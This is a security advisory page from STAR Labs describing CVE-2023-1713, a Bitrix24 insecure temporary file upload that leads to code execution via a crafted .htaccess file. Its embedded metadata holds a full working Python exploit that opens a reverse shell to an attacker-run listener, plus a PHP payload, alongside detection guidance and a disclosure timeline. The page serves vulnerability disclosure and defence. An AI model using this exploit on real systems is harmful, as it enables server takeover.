<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>(CVE-2023-1713) Bitrix24 Remote Command Execution (RCE) via Insecure Temporary File Creation | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Summary    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1713   CVE Description Insecure temporary file creation in bitrix/modules/crm/lib/order/import/instagram.php in Bitrix24 22.0.300 hosted on Apache HTTP Server allows remote authenticated attackers to execute arbitrary code via uploading a crafted &ldquo;.">
<meta name="author" content="Lam Jun Rong &amp; Li Jiantao (@CurseRed)">
<link rel="canonical" href="https://starlabs.sg/advisories/23/23-1713/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="(CVE-2023-1713) Bitrix24 Remote Command Execution (RCE) via Insecure Temporary File Creation" />
<meta property="og:description" content="Summary    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1713   CVE Description Insecure temporary file creation in bitrix/modules/crm/lib/order/import/instagram.php in Bitrix24 22.0.300 hosted on Apache HTTP Server allows remote authenticated attackers to execute arbitrary code via uploading a crafted &ldquo;." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/advisories/23/23-1713/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
<meta property="article:published_time" content="2023-11-01T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-11-01T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="(CVE-2023-1713) Bitrix24 Remote Command Execution (RCE) via Insecure Temporary File Creation"/>
<meta name="twitter:description" content="Summary    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1713   CVE Description Insecure temporary file creation in bitrix/modules/crm/lib/order/import/instagram.php in Bitrix24 22.0.300 hosted on Apache HTTP Server allows remote authenticated attackers to execute arbitrary code via uploading a crafted &ldquo;."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Advisories",
      "item": "https://starlabs.sg/advisories/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "(CVE-2023-1713) Bitrix24 Remote Command Execution (RCE) via Insecure Temporary File Creation",
      "item": "https://starlabs.sg/advisories/23/23-1713/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "(CVE-2023-1713) Bitrix24 Remote Command Execution (RCE) via Insecure Temporary File Creation",
  "name": "(CVE-2023-1713) Bitrix24 Remote Command Execution (RCE) via Insecure Temporary File Creation",
  "description": "Summary    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1713   CVE Description Insecure temporary file creation in bitrix/modules/crm/lib/order/import/instagram.php in Bitrix24 22.0.300 hosted on Apache HTTP Server allows remote authenticated attackers to execute arbitrary code via uploading a crafted \u0026ldquo;.",
  "keywords": [
    
  ],
  "articleBody": "Summary    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1713   CVE Description Insecure temporary file creation in bitrix/modules/crm/lib/order/import/instagram.php in Bitrix24 22.0.300 hosted on Apache HTTP Server allows remote authenticated attackers to execute arbitrary code via uploading a crafted “.htaccess” file.   CWE Classification(s) CWE-73 External Control of File Name or Path; CWE-434 Unrestricted Upload of File with Dangerous Type   CAPEC Classification(s) CAPEC-549 Local Execution of Code    CVSS3.1 Scoring System Base Score: 8.8 (High) Vector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) Low   Privileges Required (PR) Low   User Interaction (UI) None   Scope (S) Unchanged   Confidentiality (C) High   Integrity (I) High   Availability (A) High    Vulnerability Details This report presents information on an insecure temporary file creation vulnerability in Bitrix24 which allows an adversary to run arbitrary commands on the affected web server.\nIt was discovered that the importAjax action of the crm.order.import.instagram.view component located at bitrix/components/bitrix/crm.order.import.instagram.view/class.php downloads an attacker controlled file and saves it as a temporary file in the upload directory. As the attacker has full control over the name of the file, they can override important configuration files such as .htaccess and thus achieve remote code execution.\nThe importAjaxAction function is called when a POST request is made to https://TARGET_HOST/bitrix/services/main/ajax.php?mode=class\u0026c=bitrix%3Acrm.order.import.instagram.view\u0026action=importAjax.\nThis function eventually calls Instagram::saveImage (found in bitrix/modules/crm/lib/order/import/instagram.php lines 476 to 514) where the vulnerability occurs:\n// bitrix/modules/crm/lib/order/import/instagram.php  protected static function saveImage($url){ $fileId = false; $httpClient = new HttpClient(); $httpClient-setTimeout(5); $httpClient-setStreamTimeout(5); $urlComponents = parse_url($url); if ($urlComponents \u0026\u0026 $urlComponents['path']  ''){ $tempPath = \\CFile::GetTempName( '', bx_basename($urlComponents['path']) // [1]  ); }else{ $tempPath = \\CFile::GetTempName('', bx_basename($url)); } $httpClient-download($url, $tempPath); // [2]  // Move temporary file to permanent location } At [1], the server generates the path where the downloaded file is stored using the CFile::GetTempName function. The second parameter of this function, $file_name is derived from the attacker supplied URL via the bx_basename function which returns the trailing name component of the path.\nFor example, if the attacker controlled $url is https://attacker.com/example.txt, the $file_name argument will be example.txt.\nCFile::GetTempName calls CTempFile::GetFileName after minor processing on the $file_name parameter.\nCTempFile::GetFileName generates a path of the form $BITRIX_ROOT/upload/tmp/xxx/$file_name, where xxx is a randomly generated 3 character alphanumeric string.\nAt [2], the attacker controlled file is downloaded, and subsequently saved to the path generated in [1]. It is important to note that the path generated by CTempFile::GetFileName ends with the attacker controlled filename, therefore they have full control over the name of the file that is created, but not its path.\nIf the Apache web server is used, as is recommended by the Bitrix24 installation guide, the creation of an attacker controlled .htaccess file could allow the attacker to alter the configuration applied to files in the same directory as the .htaccess file.\nA malicious attacker may craft a .htaccess file that enables public read access to itself, then configures Apache to interpret the file as PHP code. This would result in the execution of attacker controlled code on the web server. An example of such a file is included in the Proof-of-Concept section below.\nThe last remaining hurdle to an attacker is determining the location of the uploaded .htaccess file on the web server. As the generated paths are of the form $BITRIX_ROOT/upload/tmp/xxx/$file_name, where xxx is a string consisting of lowercase alphabets and numbers, there are $36^3 = 46656$ possible paths, which would require significant time to bruteforce.\nAdditionally, the temporary files are deleted when all images in the request have been downloaded and processed. With a 5 second timeout on both the initial request connection establishment and the subsequent stream download, it seems that an attacker would not have much time to execute their attack:\n// bitrix/modules/crm/lib/order/import/instagram.php  $httpClient = new HttpClient(); $httpClient-setTimeout(5); $httpClient-setStreamTimeout(5); However, it is discovered that the streamTimeout can be bypassed by a web server periodically sending a small chunk of data, such that the time interval between response body chunks is less than 5 seconds. Therefore, an attacker can delay the deletion of uploaded files for as long as desired.\nTo increase the probability of guessing a correct path, multiple “images” can be specified in a single request. This will cause the application to download copies of the same malicious .htaccess files to multiple paths, increasing the chance that an attacker guesses the path correctly.\nFor example, if the request contains 1000 “images”, on average the attacker would only need $\\frac{46656}{1000} = 46.656$ requests to correctly guess the path of one of the .htaccess files.\nBy utilizing the bypasses and optimizations detailed above, we have reliably demonstrated that an authenticated attacker may exploit this vulnerability to achieve RCE within 60 seconds, when the attacker and victim Bitrix24 application are located on the same device.\nAn attacker could further improve the success rate of the attack by sending requests in parallel or increasing the number of .htaccess files downloaded.\nProof-of-Concept We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that exploits the insecure temporary file creation vulnerability and opens a reverse shell connection to the victim web server.\nIt is worth noting that a user without any permissions or access to any group can exploit this vulnerability.\nA sample exploit script is shown below:\n# Bitrix24 Insecure Tempory File creation RCE (CVE-2023-XXXXX) # Via: https://TARGET_HOST/bitrix/services/main/ajax.php?mode=class\u0026c=bitrix%3acrm.order.import.instagram.view\u0026action=importAjax # Author: Lam Jun Rong (STAR Labs SG Pte. Ltd.) #!/usr/bin/env python3 import requests import re import os import typing import time import itertools import string import subprocess import http.server from http.server import HTTPServer from socketserver import ThreadingMixIn import threading from urllib.parse import urlparse HOST = \"http://localhost:8000\" SITE_ID = \"s1\" USERNAME = \"user\" PASSWORD = \"abcdef\" LPORT1 = 8001 LPORT2 = 9001 LHOST = \"192.168.86.43\" DELAY_SECONDS = 60 N_REPS = 1000 PROXY = None def nested_to_urlencoded(val: typing.Any, prefix=\"\") - dict: out = dict() if type(val) is dict: for k, v in val.items(): child = nested_to_urlencoded(v, prefix=f\"[{k}]\") for key, val in child.items(): out[prefix + key] = val elif type(val) in [list, tuple]: for i, item in enumerate(val): child = nested_to_urlencoded(item, prefix=f\"[{i}]\") for key, val in child.items(): out[prefix + key] = val else: out[prefix] = val return out def check_creds(cookie, sessid): return requests.get(HOST + \"/bitrix/tools/public_session.php\", headers={ \"X-Bitrix-Csrf-Token\": sessid }, cookies={ \"PHPSESSID\": cookie, }, proxies=PROXY).text == \"OK\" def login(session, username, password): if os.path.isfile(\"./cached-creds.txt\"): cookie, sessid = open(\"./cached-creds.txt\").read().split(\":\") if check_creds(cookie, sessid): session.cookies.set(\"PHPSESSID\", cookie) print(\"[+] Using cached credentials\") return sessid else: print(\"[!] Cached credentials are invalid\") session.get(HOST + \"/\") resp = session.post( HOST + \"/?login=yes\", data={ \"AUTH_FORM\": \"Y\", \"TYPE\": \"AUTH\", \"backurl\": \"/\", \"USER_LOGIN\": username, \"USER_PASSWORD\": password, }, ) if session.cookies.get(\"BITRIX_SM_LOGIN\", \"\") == \"\": print(f\"[!] Invalid credentials\") exit() sessid = re.search(re.compile(\"'bitrix_sessid':'([a-f0-9]{32})'\"), resp.text).group( 1 ) print(f\"[+] Logged in as {username}\") with open(\"./cached-creds.txt\", \"w\") as f: f.write(f\"{session.cookies.get('PHPSESSID')}:{sessid}\") return sessid def start_server(): class MyHandler(http.server.BaseHTTPRequestHandler): htaccess = open(\"./.htaccess\", \"rb\").read() def do_GET(self): path = urlparse(self.path).path self.send_response(200) self.end_headers() # Request .htaccess if \".htaccess\" in path: self.wfile.write(self.htaccess) self.wfile.flush() return # Delay print(\"[+] Delaying return by\", DELAY_SECONDS, \"seconds\") # send the body of the response for i in range(DELAY_SECONDS): self.wfile.write(b\"A\\n\") self.wfile.flush() time.sleep(1) # Shutdown server when done self.server.shutdown() def log_message(self, format: str, *args: typing.Any) - None: # Silence logging pass class ThreadedHTTPServer(ThreadingMixIn, HTTPServer): \"\"\"Handle requests in a separate thread.\"\"\" httpd = ThreadedHTTPServer((\"0.0.0.0\", LPORT1), MyHandler) def forever(): with httpd: httpd.serve_forever() thread = threading.Thread(target=forever, daemon=True) thread.start() print(\"[+] Started HTTP server on\", LPORT1) return httpd def instagram_import(session, sessid): session.post( HOST + \"/bitrix/services/main/ajax.php?mode=class\u0026c=bitrix%3acrm.order.import.instagram.view\u0026action=importAjax\", data=nested_to_urlencoded([{ \"IMAGES\": [ f\"http://{LHOST}:{LPORT1}/.htaccess\" ] * N_REPS + [f\"http://{LHOST}:{LPORT1}/delay\"], \"NAME\": \"Product 1\" }], prefix=\"items\" ), headers={\"X-Bitrix-Csrf-Token\": sessid}, ) print(\"[+] Waiting done\") def test_exists(dir_name): resp = requests.head(f\"{HOST}/upload/tmp/{dir_name}/.htaccess\", proxies=PROXY) return resp.status_code == 200 def bruteforce(): print(\"[+] Bruteforcing .htaccess location\") chars = string.digits + string.ascii_lowercase for dir_name in itertools.product(chars, repeat=3): dir_name = \"\".join(dir_name) if test_exists(dir_name): print(f\"[+] Found .htaccess: {HOST}/upload/tmp/{dir_name}/.htaccess\") return dir_name def reverse_shell(dir_name): requests.get(f\"{HOST}/upload/tmp/{dir_name}/.htaccess?ip={LHOST}\u0026port={LPORT2}\", proxies=PROXY) if __name__ == \"__main__\": s = requests.Session() s.proxies = PROXY sessid = login(s, USERNAME, PASSWORD) start_server() threading.Thread(target=instagram_import, args=(s, sessid)).start() dir_name = bruteforce() threading.Thread(target=reverse_shell, args=(dir_name,)).start() print(\"[+] Waiting for reverse shell connection\") subprocess.run([\"nc\", \"-nvlp\", str(LPORT2)]) .htaccess file:\nRequire all granted Order allow,deny Allow from all SetHandler application/x-httpd-php  # $sock, 1=$sock, 2=$sock),$pipes); ? This file is required to be present in the same directory as the Python3 exploit code. When running the exploit code, it will spawn an HTTP server on LPORT1 serving the malicious .htaccess file, and also start a netcat listener on LPORT2 for the reverse shell.\nExploit Conditions This vulnerability can be exploited when the attacker has any valid set of credentials (regardless of privileges).\nDetection Guidance It is possible to detect the exploitation of this vulnerability by checking the server’s access logs for all requests made to /upload/tmp/xxx/.htaccess where xxx is a 3 character alphanumeric string, or any request made to /upload/tmp/ as this path is not supposed to be accessed over HTTP request. A large number of requests to such URLs is strongly indicative of exploitation of this vulnerability.\nCredits Lam Jun Rong \u0026 Li Jiantao of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline  2023-03-17 Initial Vendor Contact via https://www.bitrix24.com/report/ 2023-03-18 No reply from vendor, tried using the form again 2023-03-21 Email to info@bitrix.com 2023-03-21 Email to info@1c-bitrix.ru 2023-03-24 Got reply from info@1c-bitrix.ru, they asked us to email to info@bitrix.com or use the form at https://www.bitrix24.com/report/ with regards to the bug reports 2023-03-29 Emailed to [redacted], [redacted] \u0026 [redacted]. Team member found the 3 email addresses via an [USA bug bounty platform] 2023-03-30 [redacted] replied to us 2023-03-31 [redacted] wanted us to report the bugs via that [USA bug bounty platform] 2023-03-31 Emailed back to [redacted] that we are unable to do so because it’s a private program in that [USA bug bounty platform] 2023-03-31 [redacted] emailed back with the invite 2023-03-31 Submitted the reports via that [USA bug bounty platform] 2023-03-31 Informed [redacted] again that we are unable to report all the bugs due to [blah blah blah Requirements] 2023-04-03 [redacted] replied that they had remove the [blah blah blah Requirements] limitations for us 2023-04-04 We submitted the final 2 reports 2023-06-21 [redacted] emailed us “Generally, we prefer not to publish CVE, because our clients tend to postpone or skip even critical updates, and hackers definitely will be using this information for attacking our clients. It have happened several times in the past, with huge consequences for our company and for our clients. To tell the truth, I would like to set award on [USA bug bounty platform] instead of CVE publishing. Please let me know what do you think about that.” 2023-06-23 Emailed back to Bitrix that we prefer to publish the CVE and do not want the reward. We are also willing to delay the publication at a mutually agreed date. 2023-09-22 [redacted] finally replied asking us if we are agreeable to publish the CVE in November 2023 2023-09-22 Emailed back that we are agreeable to delay the publication to 1st November 2023 2023-09-22 [redacted] accepted the date 2023-11-01 Public Release  ",
  "wordCount" : "1825",
  "inLanguage": "en",
  "datePublished": "2023-11-01T00:00:00Z",
  "dateModified": "2023-11-01T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Lam Jun Rong \u0026 Li Jiantao (@CurseRed)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/advisories/23/23-1713/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
    <h1 class="post-title">
      (CVE-2023-1713) Bitrix24 Remote Command Execution (RCE) via Insecure Temporary File Creation
    </h1>
    <div class="post-meta"><span title='2023-11-01 00:00:00 +0000 UTC'>November 1, 2023</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Lam Jun Rong &amp; Li Jiantao (@CurseRed)

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#summary" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System">CVSS3.1 Scoring System</a></li>
                <li>
                    <a href="#vulnerability-details" aria-label="Vulnerability Details">Vulnerability Details</a></li>
                <li>
                    <a href="#proof-of-concept" aria-label="Proof-of-Concept">Proof-of-Concept</a></li>
                <li>
                    <a href="#exploit-conditions" aria-label="Exploit Conditions">Exploit Conditions</a></li>
                <li>
                    <a href="#detection-guidance" aria-label="Detection Guidance">Detection Guidance</a></li>
                <li>
                    <a href="#credits" aria-label="Credits">Credits</a></li>
                <li>
                    <a href="#timeline" aria-label="Timeline">Timeline</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Bitrix24</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Vendor</strong></td>
<td>Bitrix24</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>Bitrix24 22.0.300 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>Bitrix24 22.0.300 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>CVE-2023-1713</td>
</tr>
<tr>
<td><strong>CVE Description</strong></td>
<td>Insecure temporary file creation in bitrix/modules/crm/lib/order/import/instagram.php in Bitrix24 22.0.300 hosted on Apache HTTP Server allows remote authenticated attackers to execute arbitrary code via uploading a crafted &ldquo;.htaccess&rdquo; file.</td>
</tr>
<tr>
<td><strong>CWE Classification(s)</strong></td>
<td>CWE-73 External Control of File Name or Path; CWE-434 Unrestricted Upload of File with Dangerous Type</td>
</tr>
<tr>
<td><strong>CAPEC Classification(s)</strong></td>
<td>CAPEC-549 Local Execution of Code</td>
</tr>
</tbody>
</table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
<p><strong>Base Score:</strong> 8.8 (High)
<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Unchanged</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody>
</table>
<h2 id="vulnerability-details">Vulnerability Details<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
<p>This report presents information on an insecure temporary file creation vulnerability in Bitrix24 which allows an adversary to run arbitrary commands on the affected web server.</p>
<p>It was discovered that the <code>importAjax</code> action of the <code>crm.order.import.instagram.view</code> component located at <code>bitrix/components/bitrix/crm.order.import.instagram.view/class.php</code> downloads an attacker controlled file and saves it as a temporary file in the <code>upload</code> directory. As the attacker has full control over the name of the file, they can override important configuration files such as <code>.htaccess</code> and thus achieve remote code execution.</p>
<p>The <code>importAjaxAction</code> function is called when a POST request is made to <code>https://TARGET_HOST/bitrix/services/main/ajax.php?mode=class&amp;c=bitrix%3Acrm.order.import.instagram.view&amp;action=importAjax</code>.</p>
<p>This function eventually calls <code>Instagram::saveImage</code> (found in <code>bitrix/modules/crm/lib/order/import/instagram.php</code> lines 476 to 514) where the vulnerability occurs:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/crm/lib/order/import/instagram.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">saveImage</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$fileId</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$httpClient</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">HttpClient</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$httpClient</span><span class="o">-&gt;</span><span class="na">setTimeout</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$httpClient</span><span class="o">-&gt;</span><span class="na">setStreamTimeout</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$urlComponents</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$urlComponents</span> <span class="o">&amp;&amp;</span> <span class="nv">$urlComponents</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="o">&lt;&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$tempPath</span> <span class="o">=</span> <span class="nx">\CFile</span><span class="o">::</span><span class="na">GetTempName</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">bx_basename</span><span class="p">(</span><span class="nv">$urlComponents</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">])</span> <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$tempPath</span> <span class="o">=</span> <span class="nx">\CFile</span><span class="o">::</span><span class="na">GetTempName</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">bx_basename</span><span class="p">(</span><span class="nv">$url</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$httpClient</span><span class="o">-&gt;</span><span class="na">download</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$tempPath</span><span class="p">);</span> <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Move temporary file to permanent location
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>At <code>[1]</code>, the server generates the path where the downloaded file is stored using the <code>CFile::GetTempName</code> function. The second parameter of this function, <code>$file_name</code> is derived from the attacker supplied URL via the <code>bx_basename</code> function which returns the trailing name component of the path.</p>
<p>For example, if the attacker controlled <code>$url</code> is <code>https://attacker.com/example.txt</code>, the <code>$file_name</code> argument will be <code>example.txt</code>.</p>
<p><code>CFile::GetTempName</code> calls <code>CTempFile::GetFileName</code> after minor processing on the <code>$file_name</code> parameter.</p>
<p><code>CTempFile::GetFileName</code> generates a path of the form <code>$BITRIX_ROOT/upload/tmp/xxx/$file_name</code>, where <code>xxx</code> is a randomly generated 3 character alphanumeric string.</p>
<p>At <code>[2]</code>, the attacker controlled file is downloaded, and subsequently saved to the path generated in <code>[1]</code>. It is important to note that the path generated by <code>CTempFile::GetFileName</code> ends with the attacker controlled filename, therefore they have full control over the name of the file that is created, but not its path.</p>
<p>If the Apache web server is used, as is <a href="https://training.bitrix24.com/support/training/course/?COURSE_ID=58&amp;LESSON_ID=5907">recommended</a> by the Bitrix24 installation guide, the creation of an attacker controlled <code>.htaccess</code> file could allow the attacker to alter the configuration applied to files in the same directory as the <code>.htaccess</code> file.</p>
<p>A malicious attacker may craft a <code>.htaccess</code> file that enables public read access to itself, then configures Apache to interpret the file as PHP code. This would result in the execution of attacker controlled code on the web server. An example of such a file is included in the Proof-of-Concept section below.</p>
<p>The last remaining hurdle to an attacker is determining the location of the uploaded <code>.htaccess</code> file on the web server. As the generated paths are of the form <code>$BITRIX_ROOT/upload/tmp/xxx/$file_name</code>, where <code>xxx</code> is a string consisting of lowercase alphabets and numbers, there are $36^3 = 46656$ possible paths, which would require significant time to bruteforce.</p>
<p>Additionally, the temporary files are deleted when all images in the request have been downloaded and processed. With a 5 second timeout on both the initial request connection establishment and the subsequent stream download, it seems that an attacker would not have much time to execute their attack:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/crm/lib/order/import/instagram.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nv">$httpClient</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">HttpClient</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$httpClient</span><span class="o">-&gt;</span><span class="na">setTimeout</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$httpClient</span><span class="o">-&gt;</span><span class="na">setStreamTimeout</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
</span></span></code></pre></div><p>However, it is discovered that the <code>streamTimeout</code> can be bypassed by a web server periodically sending a small chunk of data, such that the time interval between response body chunks is less than 5 seconds. Therefore, an attacker can delay the deletion of uploaded files for as long as desired.</p>
<p>To increase the probability of guessing a correct path, multiple &ldquo;images&rdquo; can be specified in a single request. This will cause the application to download copies of the same malicious <code>.htaccess</code> files to multiple paths, increasing the chance that an attacker guesses the path correctly.</p>
<p>For example, if the request contains 1000 &ldquo;images&rdquo;, on average the attacker would only need $\frac{46656}{1000} = 46.656$ requests to correctly guess the path of one of the <code>.htaccess</code> files.</p>
<p>By utilizing the bypasses and optimizations detailed above, we have reliably demonstrated that an authenticated attacker may exploit this vulnerability to achieve RCE within 60 seconds, when the attacker and victim Bitrix24 application are located on the same device.</p>
<p>An attacker could further improve the success rate of the attack by sending requests in parallel or increasing the number of <code>.htaccess</code> files downloaded.</p>
